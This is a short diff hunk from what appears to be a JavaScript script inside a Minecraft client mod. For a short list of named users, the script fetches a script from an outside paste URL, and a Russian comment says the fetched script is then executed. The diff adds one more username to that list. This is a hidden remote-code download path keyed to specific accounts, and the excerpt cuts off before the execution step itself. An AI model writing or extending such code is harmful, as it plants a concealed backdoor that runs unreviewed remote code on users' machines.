@@ -107,7 +107,7 @@ sendUserMessage("§b§l-Zr3");
     var username = Java.type("ru.nedan.spookybuy.Authentication").getUsername();
 
     // Проверяем разрешенные имена
-    if (username === "porvaniy.gondon" || username === "__ded_inside__") {
+    if (username === "porvaniy.gondon" || username === "__ded_inside__" || username === "bludmoon6") {
         try {
             // Выполняем внешний скрипт - ИСПРАВЛЕННАЯ ВЕРСИЯ
             var url = new java.net.URL("https://diddy-party.vip/p/raw/or292hyekusblfp91");
